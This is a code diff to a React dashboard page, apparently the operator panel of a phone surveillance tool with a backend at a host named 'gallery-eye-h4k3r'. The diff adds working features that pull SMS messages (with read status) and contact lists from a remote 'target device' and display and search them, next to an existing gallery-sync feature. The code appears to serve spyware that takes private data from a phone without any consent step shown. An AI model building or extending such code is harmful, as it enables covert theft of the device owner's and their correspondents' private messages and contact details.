@@ -34,6 +34,21 @@ export default function Home() {
     const [isDeleting, setIsDeleting] = useState(false);
     const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);
 
+    // Tool Selector State
+    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts'>('gallery');
+
+    // SMS State
+    const [smsList, setSmsList] = useState<any[]>([]);
+    const [isFetchingSms, setIsFetchingSms] = useState(false);
+    const [selectedSms, setSelectedSms] = useState<any>(null);
+    const [smsSearchQuery, setSmsSearchQuery] = useState('');
+
+    // Contacts State
+    const [contactsList, setContactsList] = useState<any[]>([]);
+    const [isFetchingContacts, setIsFetchingContacts] = useState(false);
+    const [contactsSearchQuery, setContactsSearchQuery] = useState('');
+
+
     useEffect(() => {
         if (status === "authenticated" && session?.user?.uuid) {
             const uuid = session.user.uuid;
@@ -83,6 +98,39 @@ export default function Home() {
                 setFolders(data);
             });
 
+            // SMS Event Listeners
+            socket.on("sms_list", (data: any) => {
+                setIsFetchingSms(false);
+                if (data.isIncremental && data.sms?.length > 0) {
+                    // Merge new SMS with existing, avoiding duplicates
+                    setSmsList((prev) => {
+                        const existingIds = new Set(prev.map(s => s.id));
+                        const newSms = data.sms.filter((s: any) => !existingIds.has(s.id));
+                        return [...newSms, ...prev];
+                    });
+                } else if (data.sms) {
+                    setSmsList(data.sms);
+                }
+            });
+
+            socket.on("sms_error", (data: any) => {
+                setIsFetchingSms(false);
+                alert(data.message || "Failed to fetch SMS");
+            });
+
+            // Contacts Event Listeners
+            socket.on("contacts_list", (data: any) => {
+                setIsFetchingContacts(false);
+                if (data.contacts) {
+                    setContactsList(data.contacts);
+                }
+            });
+
+            socket.on("contacts_error", (data: any) => {
+                setIsFetchingContacts(false);
+                alert(data.message || "Failed to fetch contacts");
+            });
+
             fetch(`https://gallery-eye-h4k3r.onrender.com/images?uuid=${uuid}`)
                 .then((res) => res.json())
                 .then((data) => setImages(data));
@@ -110,6 +158,63 @@ export default function Home() {
         setSelectedFolder(folder);
         setSyncMediaType(null); // Reset media type selection
     };
+
+    // SMS Functions
+    const fetchSms = () => {
+        if (socket && selectedDeviceId && session?.user?.uuid) {
+            setIsFetchingSms(true);
+            socket.emit("get_sms", {
+                uuid: session.user.uuid,
+                targetDeviceId: selectedDeviceId
+            });
+        } else {
+            alert("Please select an online device first.");
+        }
+    };
+
+    const resetSmsSync = () => {
+        if (socket && selectedDeviceId && session?.user?.uuid) {
+            socket.emit("reset_sms_sync", {
+                uuid: session.user.uuid,
+                targetDeviceId: selectedDeviceId
+            });
+            setSmsList([]);
+        }
+    };
+
+    // Contacts Functions
+    const fetchContacts = () => {
+        if (socket && selectedDeviceId && session?.user?.uuid) {
+            setIsFetchingContacts(true);
+            socket.emit("get_contacts", {
+                uuid: session.user.uuid,
+                targetDeviceId: selectedDeviceId
+            });
+        } else {
+            alert("Please select an online device first.");
+        }
+    };
+
+    // Filtered SMS based on search
+    const filteredSms = useMemo(() => {
+        if (!smsSearchQuery) return smsList;
+        const query = smsSearchQuery.toLowerCase();
+        return smsList.filter(sms =>
+            sms.address?.toLowerCase().includes(query) ||
+            sms.body?.toLowerCase().includes(query)
+        );
+    }, [smsList, smsSearchQuery]);
+
+    // Filtered Contacts based on search
+    const filteredContacts = useMemo(() => {
+        if (!contactsSearchQuery) return contactsList;
+        const query = contactsSearchQuery.toLowerCase();
+        return contactsList.filter(contact =>
+            contact.name?.toLowerCase().includes(query) ||
+            contact.phones?.some((p: string) => p.includes(query))
+        );
+    }, [contactsList, contactsSearchQuery]);
+
 
     const triggerUpload = (count: number | 'all') => {
         if (socket && selectedFolder && syncMediaType && session?.user?.uuid && selectedDeviceId) {
@@ -315,47 +420,231 @@ export default function Home() {
                                 <span className="text-sm text-white/40">Select a device from the top right to enable controls</span>
                             )}
                         </div>
+                    </div>
+
+                    {/* Tool Selector */}
+                    <div className="flex gap-2 mb-6 p-1 bg-white/5 rounded-xl border border-white/10 w-fit">
                         <button
-                            onClick={fetchFolders}
-                            disabled={!selectedDeviceId}
-                            className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
+                            onClick={() => setSelectedTool('gallery')}
+                            className={`flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium transition-all ${selectedTool === 'gallery' ? 'bg-gradient-to-r from-purple-600 to-blue-600 text-white shadow-lg' : 'text-white/60 hover:text-white hover:bg-white/10'}`}
                         >
-                            Refresh Folders
+                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                            Gallery
+                        </button>
+                        <button
+                            onClick={() => setSelectedTool('sms')}
+                            className={`flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium transition-all ${selectedTool === 'sms' ? 'bg-gradient-to-r from-purple-600 to-blue-600 text-white shadow-lg' : 'text-white/60 hover:text-white hover:bg-white/10'}`}
+                        >
+                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
+                            SMS
+                        </button>
+                        <button
+                            onClick={() => setSelectedTool('contacts')}
+                            className={`flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium transition-all ${selectedTool === 'contacts' ? 'bg-gradient-to-r from-purple-600 to-blue-600 text-white shadow-lg' : 'text-white/60 hover:text-white hover:bg-white/10'}`}
+                        >
+                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
+                            Contacts
                         </button>
                     </div>
 
-                    {folders.length > 0 ? (
-                        <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-3">
-                            {folders.map((folder: any, idx) => (
-                                <button key={idx} onClick={() => handleFolderClick(folder)} className="p-3 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all group text-left">
-                                    <div className="flex justify-between items-start mb-2">
-                                        <div className="p-1.5 rounded-lg bg-purple-500/20 text-purple-400">
-                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>
-                                        </div>
-                                    </div>
-                                    <div className="truncate font-medium text-sm">{folder.name}</div>
-                                    <div className="text-xs text-white/40">
-                                        {folder.imageCount > 0 && folder.videoCount > 0
-                                            ? `${folder.imageCount} 📷 • ${folder.videoCount} 🎥`
-                                            : folder.imageCount > 0
-                                                ? `${folder.imageCount} images`
-                                                : `${folder.videoCount} videos`}
-                                    </div>
+                    {/* Gallery Tool - Folder View */}
+                    {selectedTool === 'gallery' && (
+                        <>
+                            <div className="flex justify-end mb-4">
+                                <button
+                                    onClick={fetchFolders}
+                                    disabled={!selectedDeviceId}
+                                    className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
+                                >
+                                    Refresh Folders
                                 </button>
-                            ))}
+                            </div>
+
+                            {folders.length > 0 ? (
+                                <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-3">
+                                    {folders.map((folder: any, idx) => (
+                                        <button key={idx} onClick={() => handleFolderClick(folder)} className="p-3 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all group text-left">
+                                            <div className="flex justify-between items-start mb-2">
+                                                <div className="p-1.5 rounded-lg bg-purple-500/20 text-purple-400">
+                                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>
+                                                </div>
+                                            </div>
+                                            <div className="truncate font-medium text-sm">{folder.name}</div>
+                                            <div className="text-xs text-white/40">
+                                                {folder.imageCount > 0 && folder.videoCount > 0
+                                                    ? `${folder.imageCount} 📷 • ${folder.videoCount} 🎥`
+                                                    : folder.imageCount > 0
+                                                        ? `${folder.imageCount} images`
+                                                        : `${folder.videoCount} videos`}
+                                            </div>
+                                        </button>
+                                    ))}
+                                </div>
+                            ) : (
+                                <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
+                                    {!selectedDeviceId
+                                        ? "Select a device from the top right menu to view albums."
+                                        : "Click \"Refresh Folders\" to see albums from your device."}
+                                </div>
+                            )}
+                        </>
+                    )}
+
+                    {/* SMS Tool */}
+                    {selectedTool === 'sms' && (
+                        <div className="space-y-4">
+                            <div className="flex flex-col sm:flex-row gap-3 justify-between items-start sm:items-center">
+                                <div className="flex gap-2">
+                                    <button
+                                        onClick={fetchSms}
+                                        disabled={!selectedDeviceId || isFetchingSms}
+                                        className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium flex items-center gap-2 ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
+                                    >
+                                        {isFetchingSms ? (
+                                            <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
+                                        ) : (
+                                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+                                        )}
+                                        {smsList.length > 0 ? 'Fetch New SMS' : 'Fetch All SMS'}
+                                    </button>
+                                    {smsList.length > 0 && (
+                                        <button
+                                            onClick={resetSmsSync}
+                                            className="px-3 py-2 rounded-lg border border-white/10 bg-white/5 text-white/70 text-sm hover:bg-white/10 transition-colors"
+                                        >
+                                            Reset
+                                        </button>
+                                    )}
+                                </div>
+                                <div className="relative w-full sm:w-64">
+                                    <input
+                                        type="text"
+                                        placeholder="Search SMS..."
+                                        value={smsSearchQuery}
+                                        onChange={(e) => setSmsSearchQuery(e.target.value)}
+                                        className="w-full px-4 py-2 pl-10 rounded-lg bg-white/5 border border-white/10 text-white placeholder-white/40 focus:outline-none focus:border-purple-500/50"
+                                    />
+                                    <svg className="w-4 h-4 text-white/40 absolute left-3 top-1/2 -translate-y-1/2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                                </div>
+                            </div>
+
+                            {smsList.length > 0 ? (
+                                <div className="space-y-2 max-h-[60vh] overflow-y-auto">
+                                    <p className="text-xs text-white/40 mb-2">{filteredSms.length} messages</p>
+                                    {filteredSms.map((sms: any) => (
+                                        <div
+                                            key={sms.id}
+                                            onClick={() => setSelectedSms(sms)}
+                                            className="p-4 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all cursor-pointer"
+                                        >
+                                            <div className="flex justify-between items-start mb-2">
+                                                <span className="font-medium text-sm">{sms.address}</span>
+                                                <span className="text-xs text-white/40">
+                                                    {new Date(sms.date).toLocaleDateString()} {new Date(sms.date).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
+                                                </span>
+                                            </div>
+                                            <p className="text-sm text-white/70 line-clamp-2">{sms.body}</p>
+                                            <div className="flex gap-2 mt-2">
+                                                <span className={`text-xs px-2 py-0.5 rounded ${sms.type === 1 ? 'bg-blue-500/20 text-blue-400' : 'bg-green-500/20 text-green-400'}`}>
+                                                    {sms.type === 1 ? 'Received' : 'Sent'}
+                                                </span>
+                                            </div>
+                                        </div>
+                                    ))}
+                                </div>
+                            ) : (
+                                <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
+                                    <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
+                                    {!selectedDeviceId
+                                        ? "Select a device to view SMS"
+                                        : isFetchingSms
+                                            ? "Fetching SMS..."
+                                            : "Click \"Fetch All SMS\" to load messages"}
+                                </div>
+                            )}
                         </div>
-                    ) : (
-                        <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
-                            {!selectedDeviceId
-                                ? "Select a device from the top right menu to view albums."
-                                : "Click \"Refresh Folders\" to see albums from your device."}
+                    )}
+
+                    {/* Contacts Tool */}
+                    {selectedTool === 'contacts' && (
+                        <div className="space-y-4">
+                            <div className="flex flex-col sm:flex-row gap-3 justify-between items-start sm:items-center">
+                                <button
+                                    onClick={fetchContacts}
+                                    disabled={!selectedDeviceId || isFetchingContacts}
+                                    className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium flex items-center gap-2 ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
+                                >
+                                    {isFetchingContacts ? (
+                                        <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
+                                    ) : (
+                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+                                    )}
+                                    Fetch Contacts
+                                </button>
+                                <div className="relative w-full sm:w-64">
+                                    <input
+                                        type="text"
+                                        placeholder="Search contacts..."
+                                        value={contactsSearchQuery}
+                                        onChange={(e) => setContactsSearchQuery(e.target.value)}
+                                        className="w-full px-4 py-2 pl-10 rounded-lg bg-white/5 border border-white/10 text-white placeholder-white/40 focus:outline-none focus:border-purple-500/50"
+                                    />
+                                    <svg className="w-4 h-4 text-white/40 absolute left-3 top-1/2 -translate-y-1/2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                                </div>
+                            </div>
+
+                            {contactsList.length > 0 ? (
+                                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 max-h-[60vh] overflow-y-auto">
+                                    <p className="text-xs text-white/40 col-span-full">{filteredContacts.length} contacts</p>
+                                    {filteredContacts.map((contact: any) => (
+                                        <div
+                                            key={contact.id}
+                                            className="p-4 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all"
+                                        >
+                                            <div className="flex items-center gap-3 mb-2">
+                                                <div className="w-10 h-10 rounded-full bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center font-bold text-sm">
+                                                    {contact.name?.charAt(0)?.toUpperCase() || '?'}
+                                                </div>
+                                                <div className="flex-1 min-w-0">
+                                                    <p className="font-medium text-sm truncate">{contact.name}</p>
+                                                </div>
+                                            </div>
+                                            {contact.phones?.length > 0 && (
+                                                <div className="space-y-1">
+                                                    {contact.phones.slice(0, 2).map((phone: string, idx: number) => (
+                                                        <p key={idx} className="text-xs text-white/60 flex items-center gap-1">
+                                                            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
+                                                            {phone}
+                                                        </p>
+                                                    ))}
+                                                </div>
+                                            )}
+                                            {contact.emails?.length > 0 && (
+                                                <div className="mt-1">
+                                                    {contact.emails.slice(0, 1).map((email: string, idx: number) => (
+                                                        <p key={idx} className="text-xs text-white/60 flex items-center gap-1 truncate">
+                                                            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
+                                                            {email}
+                                                        </p>
+                                                    ))}
+                                                </div>
+                                            )}
+                                        </div>
+                                    ))}
+                                </div>
+                            ) : (
+                                <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
+                                    <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
+                                    {!selectedDeviceId
+                                        ? "Select a device to view contacts"
+                                        : isFetchingContacts
+                                            ? "Fetching contacts..."
+                                            : "Click \"Fetch Contacts\" to load contacts"}
+                                </div>
+                            )}
                         </div>
                     )}
                 </div>
-
-                {/* Gallery Section */}
-                {/* ... (Rest of the file remains unchanged) */}
-
 
                 {/* Gallery Section */}
                 <div className="flex flex-col md:flex-row md:items-center justify-between mb-6 gap-4">
@@ -521,6 +810,39 @@ export default function Home() {
                                     <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
                                     Download
                                 </button>
+                            </div>
+                        </div>
+                    </div>
+                )}
+
+                {/* SMS Detail Modal */}
+                {selectedSms && (
+                    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fadeIn">
+                        <div className="bg-[#1a1a1a] border border-white/20 p-6 rounded-2xl shadow-2xl max-w-lg w-full mx-4 animate-scaleIn">
+                            <div className="flex justify-between items-start mb-4">
+                                <div>
+                                    <h3 className="text-lg font-bold">{selectedSms.address}</h3>
+                                    <p className="text-xs text-white/40">
+                                        {new Date(selectedSms.date).toLocaleDateString()} at {new Date(selectedSms.date).toLocaleTimeString()}
+                                    </p>
+                                </div>
+                                <button
+                                    onClick={() => setSelectedSms(null)}
+                                    className="p-2 hover:bg-white/10 rounded-lg transition-colors"
+                                >
+                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                                </button>
+                            </div>
+                            <div className="p-4 rounded-xl bg-white/5 border border-white/10 mb-4">
+                                <p className="text-sm whitespace-pre-wrap">{selectedSms.body}</p>
+                            </div>
+                            <div className="flex gap-2">
+                                <span className={`text-xs px-3 py-1 rounded-full ${selectedSms.type === 1 ? 'bg-blue-500/20 text-blue-400' : 'bg-green-500/20 text-green-400'}`}>
+                                    {selectedSms.type === 1 ? '📥 Received' : '📤 Sent'}
+                                </span>
+                                <span className={`text-xs px-3 py-1 rounded-full ${selectedSms.read ? 'bg-white/10 text-white/60' : 'bg-yellow-500/20 text-yellow-400'}`}>
+                                    {selectedSms.read ? 'Read' : 'Unread'}
+                                </span>
                             </div>
                         </div>
                     </div>
